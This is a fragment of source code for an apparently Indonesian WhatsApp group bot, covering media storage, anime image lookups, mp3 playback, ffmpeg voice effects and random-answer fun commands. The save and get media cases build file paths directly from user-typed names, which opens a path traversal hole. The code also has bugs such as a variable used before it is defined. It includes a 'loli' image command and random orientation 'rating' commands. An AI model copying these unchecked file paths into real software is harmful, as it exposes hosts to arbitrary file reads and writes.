zacky.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
break

case 'addsticker':
//Fix By M4N1K
if (!isQuotedSticker) return reply('Reply stiker nya')
svst = body.slice(12)
if (!svst) return reply('Nama sticker nya apa?')
boij = JSON.parse(JSON.stringify(ifi).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await zacky.downloadMediaMessage(boij)
setiker.push(`${svst}`)
fs.writeFileSync(`./add/stickers/${svst}.webp`, delb)
fs.writeFileSync(`./add/stik.json`, JSON.stringify(setiker))
zacky.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, { quoted: mek })
break

case 'addvn':
//Fix By M4N1K
if (!isQuotedAudio) return reply('Reply vnnya blokk!')
svst = body.slice(7)
if (!svst) return reply('Nama audionya apa su?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await zacky.downloadMediaMessage(boij)
audionye.push(`${svst}`)
fs.writeFileSync(`./add/audio/${svst}.mp3`, delb)
fs.writeFileSync('./add/audio.json', JSON.stringify(audionye))
zacky.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
break
case 'getvn':
//Fix By M4N1K
namastc = body.slice(7)
buffer = fs.readFileSync(`./add/audio/${namastc}.mp3`)
zacky.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: mek, ptt: true })
					break
					
				case 'listvn':
				case 'vnlist':
				//Fix By M4N1K
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					zacky.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break
					
				case 'addimage':
			    case 'addimg':
				//Fix By M4N1K
					if (!isQuotedImage) return reply('Reply imagenya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama imagenya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zacky.downloadMediaMessage(boij)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./add/image/${svst}.jpeg`, delb)
					fs.writeFileSync('./add/image.json', JSON.stringify(imagenye))
					zacky.sendMessage(from, `Sukses Menambahkan Image\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
					break
					
				case 'getimage':
				case 'getimg':
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./add/image/${namastc}.jpeg`)
					zacky.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
					break
					
				case 'imagelist':
				case 'listimage':
				case 'listimg':
				case 'imglist':
				//Fix By M4N1K
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					zacky.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
					
				case 'addvideo':
				//Fix By M4N1K
					if (!isQuotedVideo) return reply('Reply videonya blokk!')
					svst = body.slice(10)
					if (!svst) return reply('Nama videonya apa su?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zacky.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./add/video/${svst}.mp4`, delb)
					fs.writeFileSync('./add/video.json', JSON.stringify(videonye))
					zacky.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: mek })
					break
					
				case 'getvideo':
				//Fix By M4N1K
					namastc = body.slice(10)
					buffer = fs.readFileSync(`./add/video/${namastc}.mp4`)
					zacky.sendMessage(from, buffer, video, { mimetype: 'video/mp4', quoted: mek })
					break
					
				case 'listvideo':
				case 'videolist':
				//Fix By M4N1K
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					zacky.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break                                
					//animemenu
                     case 'waifu':
                     if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				    anu = await fetchJson(`https://arugaz.herokuapp.com/api/waifu`)
				  	buf = await getBuffer(anu.image)
				 	texs = ` *anime name* : ${anu.name} \n*deskripsi* : ${anu.desc} \n*source* : ${anu.source}`
				   	zacky.sendMessage(from, buf, image, { quoted: mek, caption: `${texs}`})
				    break
					case 'animeboy':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime%20boy`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
					case 'samehadaku':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isLimit(sender)) return reply(ind.limitend(pusname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
reply(ind.wait()) 
anu = await fetchJson(`http://docs-jojo.herokuapp.com/api/samehadaku?q=${body.slice(12)}`) 
buffer = await getBuffer(anu.thumb) 
Manikgans = `*[ SAMEHADAKU ]*\n\n\nJudul : ${anu.title}\nDesc : ${anu.desc}\nLink : ${anu.link}`
zacky.sendMessage(from, buffer, image, {quoted: mek, caption: Manikgans})
break
case 'neonime':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isLimit(sender)) return reply(ind.limitend(pusname))
if (isBanned) return reply('Maaf kamu sudah terbenned!')
zacky.updatePresence(from, Presence.composing) 
data = await fetchJson(`https://docs-jojo.herokuapp.com/api/neonime_lastest`, {method: 'get'})
teks = '=====================\n'
for (let i of data.result) {
teks += `*Title* : ${i.judul}\n*Link* : ${i.link}\n*Release* : ${i.rilis}\n=====================\n`
					}
					reply(teks.trim())
					break
					case 'dewabatch':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				reply(ind.wait()) 
				anu = await fetchJson(`http://docs-jojo.herokuapp.com/api/dewabatch?q=${body.slice(11)}`) 
				buffer = await getBuffer(anu.thumb) 
			    Manik = `* DEWABATCH *\n\n${anu.result}\n\nSinopsis : ${anu.sinopsis}`
			    zacky.sendMessage(from, buffer, image, {quoted: mek, caption: Manik})
			    break
			case 'kusonime':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					cuk = await fetchJson(`http://zekais-api.herokuapp.com/kusonime?query=${body.slice(10)}`)
					buffer = await getBuffer(cuk.thumb)
					hasil = `*[ KUSONIME ]*\n\nNama : ${cuk.title}\nView : ${cuk.view}\nGenre : ${cuk.genre}\nSeason : ${cuk.season}\nType : ${cuk.type}\nStatus : ${cuk.status_anime}\nDuration : ${cuk.duration}\nRealesed : ${cuk.released}\n\nDeskripsi : ${cuk.description}`
					zacky.sendMessage(from, buffer, image, {quoted: mek, caption: hasil })
					await limitAdd(sender)
					break
					case 'animegirl':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime%20girl`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
				    case 'animeimg':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
				    case 'loli':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=loli`, {method: 'get'})
					reply(ind.wait())
					var n = JSON.parse(JSON.stringify(anu));
					var nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					zacky.sendMessage(from, pok, image, { quoted: mek })
					break
                	case 'dewabatch':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
                    teks = body.slice(11)
                    anu = await fetchJson(`https://arugaz.herokuapp.com/api/dewabatch?q=${teks}` , {method: 'get'})
                    thum = await getBuffer(anu.thumb)
                    zacky.sendMessage(from, thum, image, {quoted: mek, caption: `${anu.result}`})
                 	break
 //===================================== MUSIC =====================================\\
case 'home':
const home = fs.readFileSync('mp3/home.mp3')
zacky.sendMessage(from, home, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'gettingold':
const getting = fs.readFileSync('mp3/gettingold.mp3')
zacky.sendMessage(from, getting, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sad':
const sad1 = fs.readFileSync('mp3/sad.mp3')
zacky.sendMessage(from, sad1, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sad2':
const sad2 = fs.readFileSync('mp3/sad2.mp3')
zacky.sendMessage(from, sad2, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sad3':
const sad3 = fs.readFileSync('mp3/sad3.mp3')
zacky.sendMessage(from, sad3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sad4':
const sad4 = fs.readFileSync('mp3/sad4.mp3')
zacky.sendMessage(from, sad4, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'aeshtetic':
const tetik = fs.readFileSync('mp3/aeshtetic.mp3')
zacky.sendMessage(from, tetik, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'aeshtetic2':
const tetik2 = fs.readFileSync('mp3/aeshtetic2.mp3')
zacky.sendMessage(from, tetik3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'aeshtetic3':
const tetik3 = fs.readFileSync('mp3/aeshtetic3.mp3')
zacky.sendMessage(from, tetik3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'aeshtetic4':
const tetik4 = fs.readFileSync('mp3/aeshtetic4.mp3')
zacky.sendMessage(from, tetik4, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'allnight':
const allnight = fs.readFileSync('mp3/allnight.mp3')
zacky.sendMessage(from, allnight, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'lucas':
const lucas = fs.readFileSync('mp3/lucas.mp3')
zacky.sendMessage(from, lucas, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sowell':
const well = fs.readFileSync('mp3/sowell.mp3')
zacky.sendMessage(from, well, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'wanna':
const wanna = fs.readFileSync('mp3/wanna.mp3')
zacky.sendMessage(from, wanna, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'up':
const ups = fs.readFileSync('mp3/up.mp3')
zacky.sendMessage(from, ups, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'yourskin':
const skin = fs.readFileSync('mp3/yourskin.mp3')
zacky.sendMessage(from, skin, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'cutmeoff':
const moff = fs.readFileSync('mp3/cutmeoff.mp3')
zacky.sendMessage(from, moff, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'beautiful':
const ful = fs.readFileSync('mp3/beautiful.mp3')
zacky.sendMessage(from, ful, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'loosinggame':
const gam = fs.readFileSync('mp3/loosinggame.mp3')
zacky.sendMessage(from, gam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'loosinginterest':
const rest = fs.readFileSync('mp3/loosinginterest.mp3')
zacky.sendMessage(from, rest, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'playdate':
const date = fs.readFileSync('mp3/playdate.mp3')
zacky.sendMessage(from, date, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'ayatkursi2':
const kursi = fs.readFileSync('mp3/ayatkursi2.mp3')
zacky.sendMessage(from, kursi, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'tilawah':
const tilawah = fs.readFileSync('mp3/tilawah.mp3')
zacky.sendMessage(from, tilawah, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sholawatnabi':
const nabi = fs.readFileSync('mp3/sholawatnabi.mp3')
zacky.sendMessage(from, nabi, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'ngaji':
const ngaji1 = fs.readFileSync('mp3/ngaji.mp3')
zacky.sendMessage(from, ngaji1, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'ngaji2':
const ngaji2 = fs.readFileSync('mp3/ngaji2.mp3')
zacky.sendMessage(from, ngaji2, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'iri':
const irimp3 = fs.readFileSync('./mp3/iri.mp3');
zacky.sendMessage(from, irimp3, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'pale':
const pa = fs.readFileSync('assets/pale.mp3')
zacky.sendMessage(from, pa, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound':
const soun = fs.readFileSync('assets/sound.mp3')
zacky.sendMessage(from, soun, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break 
case 'sound1':
satu = fs.readFileSync('./mp3/sound1.mp3');
zacky.sendMessage(from, satu, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound2':
dua = fs.readFileSync('./mp3/sound2.mp3');
zacky.sendMessage(from, dua, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound3':
tiga = fs.readFileSync('./mp3/sound3.mp3');
zacky.sendMessage(from, tiga, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound4':
empat = fs.readFileSync('./mp3/sound4.mp3');
zacky.sendMessage(from, empat, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound5':
lima = fs.readFileSync('./mp3/sound5.mp3');
zacky.sendMessage(from, lima, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound6':
enam = fs.readFileSync('./mp3/sound6.mp3');
zacky.sendMessage(from, enam, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
case 'sound7':
tujuh = fs.readFileSync('./mp3/sound7.mp3');
zacky.sendMessage(from, tujuh, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break	
case 'slowmo':
				//Nambah By M4N1K
				encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
				media = await zacky.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media)
				if (err) return reply('Error!')
				uhh = fs.readFileSync(ran)
				zacky.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
				fs.unlinkSync(ran)
				})
				break

				case 'tupai':
				//Nambah By M4N1K
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
				        })
				break
				    case 'gemok':
				//Nambah By M4N1K
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
			        ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				    case 'bass':                 
				//Nambah By M4N1K
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af equalizer=f=94:width_type=o:width=2:g=30 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
						fs.unlinkSync(ran)
					})
				break
				//funmenu
                case 'bisakah':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case 'kapankah':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','1 Hari Lagi','2 Hari Lagi','3 Hari Lagi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','7 Bulan Lagi','8 Bulan Lagi','9 Bulan Lagi','10 Bulan Lagi','11 Bulan Lagi','1 Tahun lagi','2 Tahun lagi','3 Tahun lag0i','4 Tahun lagi','5 Tahun lagi','6 Tahun lagi','7 Tahun lagi','8 Tahun lagi','9 Tahun lagi','10 Tahun lagi']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case 'apakah':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case 'bagaimanakah':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					bagaimanakah = body.slice(1)
					const bagai =['Kita Kenal?','Nanya Terus deh','Tidak Tahu','Coba Ulangi','Cari Aja Sendiri','Kurang Tahu','Mana Saya Tahu, Saya kan ikan']
					const mana = bagai[Math.floor(Math.random() * bagai.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+bagaimanakah+'*\n\nJawaban : '+ mana, text, { quoted: mek })
					await limitAdd(sender)
					break
		            case 'rate':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					rate = body.slice(1)
					const ra =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case 'sangecek':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					sange = body.slice(1)
					const sang =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const nge = sang[Math.floor(Math.random() * sang.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+sange+'*\n\nJawaban : '+ nge+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case 'gaycek':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					gayy = body.slice(1)
					const gay =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const yag = gay[Math.floor(Math.random() * gay.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+gayy+'*\n\nJawaban : '+ yag+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case 'lesbicek':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					lesbii = body.slice(1)
					const lesbi =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const bi = lesbi[Math.floor(Math.random() * lesbi.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+lesbii+'*\n\nJawaban : '+ bi+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
                    case 'gantengcek':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					ganteng = body.slice(1)
					const gan =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+ganteng+'*\n\nJawaban : '+ teng+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case 'cantikcek':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					cantik = body.slice(1)
					const can =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+cantik+'*\n\nJawaban : '+ tik+'%', text, { quoted: mek })
					await limitAdd(sender)
					break
		            case 'watak':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					watak = body.slice(1)
					const wa =['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
					const tak = wa[Math.floor(Math.random() * wa.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+watak+'*\n\nJawaban : '+ tak, text, { quoted: mek })
					await limitAdd(sender)
				        break
		         case 'hobby':
					//  Case  by Manik

                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					hobby = body.slice(1)
					const hob =['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
					const by = hob[Math.floor(Math.random() * hob.length)]
					zacky.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: mek })
					await limitAdd(sender)
					break
                case 'jadian':
				
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  @${diaa.jid.split('@')[0]} `
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					mentions(teks, jds, true)
					await limitAdd(sender)
					break	
